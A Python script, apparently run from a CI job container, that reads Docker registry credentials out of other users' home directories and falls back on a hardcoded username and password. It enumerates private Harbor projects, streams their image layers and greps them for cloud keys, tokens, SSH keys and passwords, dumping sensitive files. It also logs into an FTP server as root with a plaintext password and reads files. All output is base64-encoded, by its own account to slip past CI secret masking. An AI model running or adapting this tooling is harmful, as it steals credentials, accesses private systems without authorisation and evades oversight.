#!/usr/bin/env python3
# i9454 - bounded read-only layer scan of the PRIVATE HYGON Harbor projects from the
# HCU Stage A job container. Authenticates with the sugon registry credential read from
# the runner-readable /public4 home .docker/config.json auths (fallback: the recorded
# A-8650 credential), enumerates the custom/internal/private projects, stream-decompresses
# their image layers under a byte cap with per-layer skip logging, greps every readable
# file for registry/docker/ssh/cloud/CI secrets, validates the FTP root:sugon credential
# at ftp://43.142.126.90/dockerfile_pkg with one bounded listing plus a few small-file
# reads, and probes the internal pip host 10.6.10.68:8000 once. All output is base64
# encoded (C211B64 <b64> lines) to defeat Actions masking. Read-only.
import urllib.request
import urllib.error
import urllib.parse
import json
import re
import os
import time
import tarfile
import base64
import socket
import ftplib
from concurrent.futures import ThreadPoolExecutor, as_completed

T0 = time.monotonic()
DEADLINE_SCAN = T0 + 2100          # 35 min: stop starting/continuing layer scans
DEADLINE_ALL = T0 + 2400           # 40 min: stop everything
GLOBAL_CAP = 26_000_000_000        # 26 GB downloaded across all layers
MAX_LAYER = 1_500_000_000          # skip layers larger than 1.5 GB (logged)
MAX_FILE_SCAN = 2_500_000          # read at most 2.5 MB per regular file
MAX_SENS_DUMP = 16384              # dump at most 16 KB of a sensitive file
DUMP_BUDGET = 300_000              # total raw chars of sensitive-file dumps
CAP = 1_400_000                    # raw chars of base64-encoded output

used = [0]
stats = {"dl": 0, "layers": 0, "files": 0, "hits": 0, "dumps": 0, "errors": 0}


def emit(s=""):
    s = str(s)
    if used[0] >= CAP:
        return False
    room = CAP - used[0] - 1
    if len(s) > room:
        s = s[:room]
    try:
        print("C211B64 " + base64.b64encode(s.encode("utf-8", "replace")).decode(), flush=True)
    except Exception:
        return False
    used[0] += len(s) + 1
    return True


def emit_chunked(text, per=6000):
    for i in range(0, len(text), per):
        if not emit(text[i:i + per]):
            break


def http(url, headers=None, timeout=40, method="GET"):
    req = urllib.request.Request(url, method=method, headers=headers or {})
    try:
        x = urllib.request.urlopen(req, timeout=timeout)
        return x.status, {k.lower(): v for k, v in x.headers.items()}, x
    except urllib.error.HTTPError as e:
        return e.code, {k.lower(): v for k, v in e.headers.items()}, e
    except Exception:
        return "ERR", {}, None


def readb(x, n=8192):
    if x is None:
        return b""
    try:
        b = x.read(n)
        return b if isinstance(b, bytes) else b.encode("utf-8", "replace")
    except Exception as e:
        return ("ERR " + str(e)[:100]).encode()


# ---------------- credential discovery ----------------
def parse_b64_auth(a):
    try:
        up = base64.b64decode(a + "=" * (-len(a) % 4)).decode("utf-8", "replace")
        if ":" in up:
            return up.split(":", 1)
    except Exception:
        pass
    return None


def find_creds():
    """Read /public4 home .docker/config.json auths for the HYGON Harbor endpoints."""
    found = []
    homes = "/public4/home"
    try:
        users = sorted(os.listdir(homes))
    except Exception as e:
        users = []
        emit("PUBLIC4_HOME_ERR " + str(e)[:160])
    emit("PUBLIC4_HOME users=%d" % len(users))
    regs = ("10.16.1.152", "42.228.13.241", "10.16.6.35", "sourcefind")
    for u in users[:500]:
        p = os.path.join(homes, u, ".docker", "config.json")
        try:
            with open(p) as f:
                j = json.load(f)
        except Exception:
            continue
        for reg, v in (j.get("auths") or {}).items():
            if not any(h in str(reg) for h in regs):
                continue
            a = (v or {}).get("auth")
            if not a:
                continue
            up = parse_b64_auth(a)
            if up:
                found.append({"src": p, "reg": reg, "user": up[0], "pass": up[1]})
                emit("CRED_SRC %s reg=%s user=%s" % (p, reg, up[0]))
    return found


creds = find_creds()
if not creds:
    # recorded fallback: creds/A-8650-harbor-42.228.13.241-sugon.json (sugon:3#OgWUC&)
    up = parse_b64_auth("c3Vnb246MyNPZ1dVQyY=")
    if up:
        creds = [{"src": "fallback:A-8650", "reg": "42.228.13.241:5000", "user": up[0], "pass": up[1]}]
        emit("CRED_FALLBACK A-8650")
if not creds:
    emit("FATAL no harbor credential found")
    raise SystemExit(0)
emit("CREDS found=%d users=%s" % (len(creds), sorted({c["user"] for c in creds})))

AUTH_USER = creds[0]["user"]
AUTH_PASS = creds[0]["pass"]
BASIC = "Basic " + base64.b64encode(("%s:%s" % (AUTH_USER, AUTH_PASS)).encode()).decode()

# ---------------- pick reachable registry ----------------
BASE = None
for b in ("http://10.16.1.152:5000", "http://42.228.13.241:5000"):
    s, h, x = http(b + "/v2/", timeout=12)
    emit("REGISTRY_TRY %s -> %s" % (b, s))
    if s != "ERR":
        BASE = b
        break
if not BASE:
    emit("FATAL registry unreachable")
    raise SystemExit(0)

s, h, x = http(BASE + "/v2/", headers={"Authorization": BASIC}, timeout=15)
wa = h.get("www-authenticate", "")
emit("REGISTRY %s GET /v2/ basic -> %s www-authenticate=%r" % (BASE, s, wa))
realm = re.search(r'realm="([^"]+)"', wa)
svc = re.search(r'service="([^"]+)"', wa)
REALM = realm.group(1) if realm else (BASE + "/service/token")
SERVICE = svc.group(1) if svc else "harbor-registry"
emit("REALM %s service=%s" % (REALM, SERVICE))

s, h, x = http(BASE + "/api/v2.0/users/current", headers={"Authorization": BASIC}, timeout=20)
body = readb(x, 20000).decode("utf-8", "replace")
try:
    uj = json.loads(body)
    emit("USERS_CURRENT status=%s user=%s sysadmin=%s" % (s, uj.get("username"), uj.get("sysadmin_flag")))
except Exception:
    emit("USERS_CURRENT status=%s body=%s" % (s, body[:200]))

tokens = {}


def repo_token(repo):
    if repo in tokens:
        return tokens[repo]
    u = REALM + "?" + urllib.parse.urlencode({"service": SERVICE, "scope": "repository:%s:pull" % repo})
    s2, h2, x2 = http(u, headers={"Authorization": BASIC}, timeout=30)
    tok = ""
    try:
        j = json.loads(readb(x2, 60000).decode("utf-8", "replace"))
        tok = j.get("token") or j.get("access_token") or ""
    except Exception:
        pass
    tokens[repo] = tok
    if not tok:
        emit("TOKEN_FAIL repo=%s status=%s" % (repo, s2))
    return tok


def jget(path, timeout=60):
    for i in range(2):
        s, h, x = http(BASE + path, headers={"Authorization": BASIC}, timeout=timeout)
        if s == 200:
            try:
                return json.loads(readb(x, 20_000_000).decode("utf-8", "replace"))
            except Exception:
                return None
        if s == "ERR" or (isinstance(s, int) and s >= 500):
            time.sleep(1 + i)
            continue
        return None
    return None


ACCEPT = ", ".join([
    "application/vnd.docker.distribution.manifest.v2+json",
    "application/vnd.docker.distribution.manifest.list.v2+json",
    "application/vnd.oci.image.manifest.v1+json",
    "application/vnd.oci.image.index.v1+json",
])


def hget(path, tok, timeout=90, accept=ACCEPT):
    hd = {"Accept": accept}
    if tok:
        hd["Authorization"] = "Bearer " + tok
    return http(BASE + path, headers=hd, timeout=timeout)


# ---------------- patterns ----------------
PAT = re.compile(
    rb"(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|aws_secret_access_key|aws_access_key_id|"
    rb"AIza[0-9A-Za-z_\-]{35}|-----BEGIN [A-Z0-9 ]{0,30}PRIVATE KEY-----|"
    rb"ghp_[A-Za-z0-9]{36,}|github_pat_[A-Za-z0-9_]{40,}|gho_[A-Za-z0-9]{36,}|ghs_[A-Za-z0-9]{36,}|ghu_[A-Za-z0-9]{36,}|"
    rb"glpat-[A-Za-z0-9_\-\.]{20,}|xox[baprs]-[A-Za-z0-9-]{10,}|npm_[A-Za-z0-9]{30,}|"
    rb"pypi-[A-Za-z0-9_\-]{40,}|robot\$[A-Za-z0-9+_\-]{2,}|\"auths\"\s*:|"
    rb"HARBOR_(USERNAME|PASSWORD)|DEVPI[A-Z_]*\s*[=:]|"
    rb"AccountKey\s*=\s*[A-Za-z0-9+/=]{20,}|DefaultEndpointsProtocol\s*=|"
    rb"client_secret\s*[=:]\s*\S{8,}|tenant_id\s*[=:]\s*[0-9a-f-]{20,}|"
    rb"(?i:password|passwd|pass)\s*[=:]\s*[\"']?[^\s\"'$<>]{6,}|"
    rb"(?i:token|secret|api[_-]?key)\s*[=:]\s*[\"']?[A-Za-z0-9_\-\./+=]{16,}|"
    rb"_KEY\s*[=:]\s*[\"']?[A-Za-z0-9/+=]{16,}|"
    rb"index-url\s*=\s*https?://[^\s]+:[^\s@]+@|KUBECONFIG=|client-key-data|certificate-authority-data|"
    rb"registry\s*[=:]\s*\S+:[0-9]{2,5}|"
    rb"10\.16\.1\.152:5000|42\.228\.13\.241:5000|10\.16\.6\.35:5000|harbor\.sourcefind\.cn|image\.sourcefind\.cn|"
    rb"ftp://root@|ftp-password=|--ftp-password)", re.I)

SENS = re.compile(
    r"(^|/)(\.git-credentials|\.netrc|netrc|\.npmrc|\.pypirc|\.htpasswd|\.env(\.[^/]*)?|\.runner|"
    r"\.credentials(_rsaparams)?|config\.sh|id_(rsa|dsa|ecdsa|ed25519)[^/]*|kubeconfig[^/]*|"
    r"\.docker/config\.json|\.docker/config\.json\.old|pip\.conf|pip\.ini|\.condarc|"
    r"\.config/gh/hosts\.yml|\.config/pip/pip\.conf|\.s3cfg|\.boto|"
    r"\.config/rclone/rclone\.conf|settings\.xml|gradle\.properties|"
    r"\.kube/config|\.aws/credentials|\.aws/config|\.ssh/(id_[^/]+|authorized_keys|config)|"
    r"\.bash_history|\.zsh_history|\.mysql_history|\.psql_history)(/|$)|"
    r"\.(pem|key|p12|pfx|jks|keystore)$", re.I)

TEXT_EXT = {".sh", ".bash", ".conf", ".cfg", ".ini", ".yml", ".yaml", ".json", ".txt",
            ".env", ".py", ".toml", ".xml", ".properties", ".service", ".list", ".sources",
            ".repo", ".netrc", ".npmrc", ".pypirc", ".gitconfig", ".md", ".rst", ".j2", ".tf",
            ".groovy", ".gradle", ".pl", ".rb", ".js", ".ts", ".ps1", ".bat", ".cmd", ".cnf",
            ".sql", ".lock", ".whl.metadata", ".dist-info", ".lock", ""}

NOISE = ("example", "your_", "your-", "changeme", "change_me", "${{", "redacted", "placeholder",
         "dummy", "xxxx", "<none>", "not-a-real", "fake", "sample", "foobar", "todo", "lorem",
         "mirrors.aliyun", "pypi.tuna")

seen_lines = set()
dump_budget = [0]


def scan_blob(b, maxhits=25):
    """Return credential-looking lines from a byte blob (deduped globally)."""
    out = []
    if not b:
        return out
    try:
        for m in PAT.finditer(b):
            ls = b.rfind(b"\n", 0, m.start()) + 1
            le = b.find(b"\n", m.end())
            if le < 0:
                le = min(len(b), m.end() + 240)
            line = b[ls:le][:320].decode("utf-8", "replace").strip()
            low = line.lower()
            if any(x in low for x in NOISE):
                continue
            key = line[:200]
            if key in seen_lines:
                continue
            seen_lines.add(key)
            out.append(line)
            if len(out) >= maxhits:
                break
    except Exception:
        pass
    return out


# ---------------- enumerate projects / repos / artifacts ----------------
projects = []
page = 1
while page <= 10:
    d = jget("/api/v2.0/projects?page_size=100&page=%d" % page, timeout=60)
    if not isinstance(d, list) or not d:
        break
    projects.extend(d)
    if len(d) < 100:
        break
    page += 1
emit("PROJECTS total=%d" % len(projects))
targets = []
for p in projects:
    nm = p.get("name")
    emit("PROJECT %s id=%s repos=%s public=%s" % (nm, p.get("project_id"), p.get("repo_count"),
                                                 (p.get("metadata") or {}).get("public")))
    if nm in ("custom", "internal", "private"):
        targets.append(nm)


def fetch_repos(proj):
    out = []
    pg = 1
    while pg <= 20:
        d = jget("/api/v2.0/projects/%s/repositories?page_size=100&page=%d" % (urllib.parse.quote(proj), pg), timeout=60)
        if not isinstance(d, list) or not d:
            break
        out.extend(d)
        if len(d) < 100:
            break
        pg += 1
    return proj, out


repo_list = []
with ThreadPoolExecutor(max_workers=4) as ex:
    futs = [ex.submit(fetch_repos, p) for p in targets]
    for f in as_completed(futs):
        proj, rows = f.result()
        for r in rows:
            repo_list.append((proj, r.get("name"), r.get("artifact_count")))
emit("REPOSITORIES total=%d %s" % (len(repo_list), sorted(x[1] for x in repo_list)))


def fetch_arts(item):
    proj, name, cnt = item
    short = name.split("/", 1)[1] if name.startswith(proj + "/") else name
    enc = urllib.parse.quote(urllib.parse.quote(short, safe=""), safe="")
    d = jget("/api/v2.0/projects/%s/repositories/%s/artifacts?page_size=100&page=1&sort=-push_time&with_tag=true"
             % (urllib.parse.quote(proj), enc), timeout=60)
    return item, d if isinstance(d, list) else []


arts = {}
with ThreadPoolExecutor(max_workers=6) as ex:
    futs = [ex.submit(fetch_arts, it) for it in repo_list]
    for f in as_completed(futs):
        item, rows = f.result()
        arts[item[1]] = rows
emit("ARTIFACTS repos_with_data=%d total=%d" % (sum(1 for v in arts.values() if v), sum(len(v) for v in arts.values())))

# ---------------- manifests + configs ----------------
images = []
for proj, name, cnt in repo_list:
    rows = arts.get(name) or []
    for a in rows:
        if not a.get("digest"):
            continue
        tags = [t.get("name") for t in (a.get("tags") or [])]
        images.append({"project": proj, "repo": name, "digest": a["digest"], "size": a.get("size") or 0,
                       "tag": tags[0] if tags else "", "push_time": a.get("push_time")})
emit("IMAGE_ARTIFACTS %d" % len(images))

manifest_cache = {}


def get_manifest(repo, ref):
    key = (repo, ref)
    if key in manifest_cache:
        return manifest_cache[key]
    tk = repo_token(repo)
    s, h, x = hget("/v2/%s/manifests/%s" % (repo, ref), tk, timeout=60)
    if s != 200:
        manifest_cache[key] = None
        return None
    try:
        mf = json.loads(readb(x, 4_000_000).decode("utf-8", "replace"))
    except Exception:
        manifest_cache[key] = None
        return None
    if mf.get("manifests"):
        child = None
        for m in mf["manifests"]:
            plat = m.get("platform") or {}
            if plat.get("architecture") in ("amd64", "x86_64") and plat.get("os", "linux") == "linux":
                child = m
                break
        child = child or mf["manifests"][0]
        s, h, x = hget("/v2/%s/manifests/%s" % (repo, child.get("digest")), tk, timeout=60)
        if s != 200:
            manifest_cache[key] = None
            return None
        try:
            mf = json.loads(readb(x, 4_000_000).decode("utf-8", "replace"))
        except Exception:
            manifest_cache[key] = None
            return None
    manifest_cache[key] = mf
    return mf


def fetch_one_image(img):
    repo = img["repo"]
    mf = get_manifest(repo, img["digest"]) or get_manifest(repo, img["tag"])
    if not mf:
        return None
    cfgd = (mf.get("config") or {}).get("digest")
    layers = []
    for l in (mf.get("layers") or []):
        layers.append({"digest": l.get("digest"), "size": int(l.get("size") or 0),
                       "mediaType": l.get("mediaType") or "", "urls": l.get("urls") or []})
    cfg = None
    if cfgd:
        tk = repo_token(repo)
        s, h, x = hget("/v2/%s/blobs/%s" % (repo, cfgd), tk, timeout=60, accept="application/json")
        if s == 200:
            cfg = readb(x, 2_000_000)
    return {"repo": repo, "tag": img["tag"], "digest": img["digest"], "size": img["size"],
            "config_digest": cfgd, "layers": layers, "config": cfg}


resolved = []
with ThreadPoolExecutor(max_workers=8) as ex:
    futs = {ex.submit(fetch_one_image, im): im for im in images}
    done = 0
    for f in as_completed(futs):
        done += 1
        try:
            r = f.result()
        except Exception:
            r = None
        if r:
            resolved.append(r)
        if done % 25 == 0:
            emit("MANIFEST_PROGRESS %d/%d elapsed=%ds" % (done, len(images), int(time.monotonic() - T0)))
emit("MANIFESTS resolved=%d/%d elapsed=%ds" % (len(resolved), len(images), int(time.monotonic() - T0)))

KEY = re.compile(r"(docker\s+login|harbor|\.netrc|\.npmrc|pip\.conf|pip\s+config|git[-\s]credentials|"
                 r"git\s+clone\s+https?://[^ ]*@|ssh-keygen|id_rsa|id_ed25519|known_hosts|authorized_keys|"
                 r"kubeconfig|\.kube|AKIA|ASIA|aws_secret|secret_access_key|token|password|passwd|ftp://|"
                 r"COPY\s+.*\.(sh|conf|json|pem|key)|ADD\s|\.pem|\.key)", re.I)

hist_hits = 0
for im in resolved:
    cb = im.get("config") or b""
    if not cb:
        continue
    try:
        cj = json.loads(cb.decode("utf-8", "replace"))
    except Exception:
        continue
    label = "%s:%s" % (im["repo"], im["tag"])
    emitted = 0
    for hh in (cj.get("history") or []):
        cmd = hh.get("created_by") or ""
        if not cmd or hh.get("empty_layer"):
            continue
        if KEY.search(cmd):
            emit("HIST %s | %s" % (label, cmd[:360]))
            hist_hits += 1
            emitted += 1
            if emitted >= 6 or hist_hits > 220:
                break
    cc = cj.get("config") or {}
    for e in (cc.get("Env") or []):
        if re.search(r"(?i)(pypi|pip|index|proxy|harbor|registry|token|passw|secret|key|url|mirror)", str(e)):
            emit("ENV %s | %s" % (label, str(e)[:300]))
    for k, v in (cc.get("Labels") or {}).items():
        if re.search(r"(?i)(token|passw|secret|user|registry|harbor|url)", str(k) + " " + str(v)):
            emit("LABEL %s | %s=%s" % (label, k, str(v)[:240]))
emit("CONFIG_SCAN images=%d hist_hits=%d" % (len(resolved), hist_hits))

# ---------------- layer plan ----------------
uniq = {}
order = []


def add_layer(im, idx):
    layers = im["layers"]
    l = layers[idx]
    d = l["digest"]
    if not d or d in uniq:
        return
    uniq[d] = True
    order.append({"digest": d, "size": l["size"], "mediaType": l["mediaType"], "urls": l["urls"],
                  "repo": im["repo"], "image": "%s:%s" % (im["repo"], im["tag"]),
                  "idx": idx, "nlayers": len(layers), "cmd": ""})


PRIO_REPO = {"internal/base_env/sglang": 0, "private/dev": 0, "private/custom": 0,
             "private/pytorch": 1, "private/tensorflow": 1, "private/cuda": 1, "private/nvidia/pytorch": 1}


def rprio(repo):
    return PRIO_REPO.get(repo, 2)


# map build-history commands onto non-empty layers for KEY prioritisation
cmd_by_image = {}
for im in resolved:
    cb = im.get("config") or b""
    cmds = []
    try:
        cj = json.loads(cb.decode("utf-8", "replace"))
        for hh in (cj.get("history") or []):
            if not hh.get("empty_layer"):
                cmds.append(hh.get("created_by") or "")
    except Exception:
        pass
    cmd_by_image[id(im)] = cmds

passA = sorted(resolved, key=lambda i: (rprio(i["repo"]), i["size"]))
for im in passA:
    if im["layers"]:
        add_layer(im, len(im["layers"]) - 1)
        o = order[-1]
        cmds = cmd_by_image.get(id(im)) or []
        if o["idx"] < len(cmds):
            o["cmd"] = cmds[o["idx"]]

# pass B: layers whose build command references credentials/scripts
passB = []
for im in sorted(resolved, key=lambda i: (rprio(i["repo"]), i["size"])):
    cmds = cmd_by_image.get(id(im)) or []
    for idx in reversed(range(len(im["layers"]) - 1)):
        cmd = cmds[idx] if idx < len(cmds) else ""
        if KEY.search(cmd):
            passB.append((im, idx, cmd))
for im, idx, cmd in passB:
    before = len(order)
    add_layer(im, idx)
    if len(order) > before:
        order[-1]["cmd"] = cmd

# pass C: everything else, cheap layers first inside each repo priority
passC = []
for im in sorted(resolved, key=lambda i: (rprio(i["repo"]), i["size"])):
    for idx in range(len(im["layers"])):
        passC.append((im, idx))
for im, idx in passC:
    add_layer(im, idx)

skip_big = [o for o in order if o["size"] > MAX_LAYER]
skip_zstd = [o for o in order if "zstd" in (o["mediaType"] or "").lower()]
skip_foreign = [o for o in order if o["urls"]]
plan = [o for o in order if not (o["size"] > MAX_LAYER) and "zstd" not in (o["mediaType"] or "").lower() and not o["urls"]]
emit("LAYER_PLAN unique=%d scannable=%d scannable_bytes=%d all_unique_bytes=%d skip_gt1500MB=%d skip_zstd=%d skip_foreign=%d"
     % (len(order), len(plan), sum(o["size"] for o in plan), sum(o["size"] for o in order),
        len(skip_big), len(skip_zstd), len(skip_foreign)))
for o in skip_big[:60]:
    emit("SKIP_BIG %s size=%d image=%s" % (o["digest"][:26], o["size"], o["image"]))
for o in skip_zstd[:20]:
    emit("SKIP_ZSTD %s size=%d image=%s" % (o["digest"][:26], o["size"], o["image"]))

# ---------------- layer scan ----------------
lock = None


def scan_layer(o):
    if time.monotonic() > DEADLINE_SCAN:
        return {"skip": "deadline", "o": o}
    repo = o["repo"]
    tk = repo_token(repo)
    mt = (o["mediaType"] or "").lower()
    mode = "r|" if ("tar" in mt and "gzip" not in mt) else "r|gz"
    to = 120 if o["size"] < 80_000_000 else 420
    s, h, x = hget("/v2/%s/blobs/%s" % (repo, o["digest"]), tk, timeout=to)
    if s != 200:
        return {"err": "HTTP %s" % s, "o": o}
    nbytes = 0
    files = 0
    hits = 0
    dumps = 0
    out = []
    try:
        tf = tarfile.open(fileobj=x, mode=mode)
        for m in tf:
            if time.monotonic() > DEADLINE_SCAN:
                out.append("    DEADLINE inside layer")
                break
            if not m.isfile():
                continue
            name = m.name
            size = m.size or 0
            nbytes += size
            sens = bool(SENS.search(name))
            ext = os.path.splitext(name)[1].lower()
            take = False
            if sens:
                take = True
            elif size <= MAX_FILE_SCAN and (ext in TEXT_EXT or size <= 262144):
                take = True
            if not take:
                continue
            files += 1
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                b = f.read(1024 * 1024)
            except Exception:
                continue
            if sens:
                out.append("    FILE %s size=%d" % (name, size))
                if len(b) <= MAX_SENS_DUMP and dump_budget[0] < DUMP_BUDGET:
                    dumps += 1
                    dump_budget[0] += len(b)
                    try:
                        txt = b.decode("utf-8", "replace")
                    except Exception:
                        txt = base64.b64encode(b).decode()
                    out.append("      DUMP " + txt.replace("\n", "\\n")[:MAX_SENS_DUMP])
            for line in scan_blob(b, 5):
                out.append("    HIT %s: %s" % (name, line[:300]))
                hits += 1
                if hits >= 20:
                    break
            if hits >= 20:
                break
        try:
            tf.close()
        except Exception:
            pass
    except Exception as e:
        return {"err": ("tar " + str(e)[:100]), "o": o, "bytes": nbytes, "hits": hits, "out": out,
                "files": files, "dumps": dumps}
    return {"err": None, "o": o, "bytes": nbytes, "hits": hits, "out": out, "files": files, "dumps": dumps}


futs = {}
idx = 0
stop = False
with ThreadPoolExecutor(max_workers=5) as ex:
    while idx < len(plan) and not stop:
        while idx < len(plan) and len(futs) < 5 and not stop:
            it = plan[idx]
            idx += 1
            if time.monotonic() > DEADLINE_SCAN or stats["dl"] >= GLOBAL_CAP:
                stop = True
                idx -= 1
                break
            futs[ex.submit(scan_layer, it)] = it
        if not futs:
            break
        for f in as_completed(list(futs)):
            it = futs.pop(f)
            try:
                r = f.result()
            except Exception as e:
                r = {"err": "exc " + str(e)[:100], "o": it}
            stats["dl"] += it["size"]
            stats["layers"] += 1
            stats["files"] += r.get("files", 0) or 0
            stats["hits"] += r.get("hits", 0) or 0
            stats["dumps"] += r.get("dumps", 0) or 0
            if r.get("err"):
                stats["errors"] += 1
            emit("LAYER [%d/%d] %s size=%d image=%s L%d/%d read=%d files=%d hits=%d dumps=%d err=%s"
                 % (stats["layers"], len(plan), it["digest"][:26], it["size"], it["image"], it["idx"],
                    it["nlayers"], r.get("bytes", 0), r.get("files", 0) or 0, r.get("hits", 0) or 0,
                    r.get("dumps", 0) or 0, r.get("err")))
            for line in (r.get("out") or []):
                if not emit(line):
                    break
            if stats["dl"] >= GLOBAL_CAP or time.monotonic() > DEADLINE_SCAN:
                stop = True
            if not stop and idx < len(plan) and len(futs) < 5:
                break
        if stop:
            break

scanned = stats["layers"]
remainder = plan[scanned:]
emit("SCAN_SUMMARY planned=%d done=%d errors=%d downloaded_bytes=%d files=%d hits=%d dumps=%d elapsed=%ds"
     % (len(plan), scanned, stats["errors"], stats["dl"], stats["files"], stats["hits"], stats["dumps"],
        int(time.monotonic() - T0)))
emit("REMAINDER unscanned_layers=%d unscanned_bytes=%d skipped_big=%d skipped_big_bytes=%d skipped_zstd=%d skipped_foreign=%d"
     % (len(remainder), sum(u["size"] for u in remainder), len(skip_big), sum(u["size"] for u in skip_big),
        len(skip_zstd), len(skip_foreign)))
for u in remainder[:80]:
    emit("UNSCANNED %s size=%d image=%s L%d" % (u["digest"][:26], u["size"], u["image"], u["idx"]))

# ---------------- FTP validation ----------------
try:
    emit("FTP_BEGIN host=43.142.126.90")
    ftp = ftplib.FTP()
    ftp.connect("43.142.126.90", 21, timeout=25)
    emit("FTP_WELCOME " + repr(ftp.getwelcome())[:200])
    ftp.login("root", "sugon")
    ftp.set_pasv(True)
    emit("FTP_LOGIN ok")
    lines = []
    ftp.retrlines("LIST /dockerfile_pkg", lambda l: lines.append(l) if len(lines) < 400 else None)
    emit("FTP_LIST /dockerfile_pkg entries=%d" % len(lines))
    for l in lines[:200]:
        emit("FTPL " + l[:300])
    # bounded subdirectory listings (exact paths the image Dockerfiles wget from)
    for sub in ("/dockerfile_pkg/python", "/dockerfile_pkg/cmake", "/dockerfile_pkg/mpi"):
        lines2 = []
        try:
            ftp.retrlines("LIST " + sub, lambda l: lines2.append(l) if len(lines2) < 120 else None)
            emit("FTP_LIST %s entries=%d" % (sub, len(lines2)))
            for l in lines2[:60]:
                emit("FTPL " + l[:300])
        except Exception as e:
            emit("FTP_LIST_ERR %s %s" % (sub, str(e)[:150]))
    # a few small-file reads from the root listing
    small = []
    for l in lines:
        m = re.match(r"^[dl-][rwxStTs-]{9}\s+\d+\s+\S+\s+\S+\s+(\d+)\s+\S+\s+\S+\s+\S+\s+(.+)$", l)
        if m:
            sz = int(m.group(1))
            nm = m.group(2).strip()
            if not l.startswith("d") and sz <= 200_000 and nm not in (".", ".."):
                small.append((sz, nm))
    small.sort()
    emit("FTP_SMALLFILES n=%d" % len(small))
    for sz, nm in small[:6]:
        try:
            buf = []
            def cb(b):
                if sum(len(z) for z in buf) < 65536:
                    buf.append(b)
            ftp.retrbinary("RETR /dockerfile_pkg/" + nm, cb, blocksize=8192)
            data = b"".join(buf)[:65536]
            emit("FTP_FILE %s size=%d got=%d" % (nm, sz, len(data)))
            emit_chunked("FTP_CONTENT " + base64.b64encode(data).decode(), 6000)
        except Exception as e:
            emit("FTP_FILE_ERR %s %s" % (nm, str(e)[:150]))
    try:
        ftp.quit()
    except Exception:
        pass
    emit("FTP_DONE")
except Exception as e:
    emit("FTP_ERR " + str(e)[:300])

# ---------------- internal pip host, one probe ----------------
try:
    s, h, x = http("http://10.6.10.68:8000/", timeout=15)
    emit("PIP_HOST status=%s server=%r" % (s, h.get("server")))
    if s != "ERR":
        body = readb(x, 4096)
        emit("PIP_BODY b64=" + base64.b64encode(body).decode())
except Exception as e:
    emit("PIP_ERR " + str(e)[:200])

emit("DONE elapsed=%ds" % int(time.monotonic() - T0))
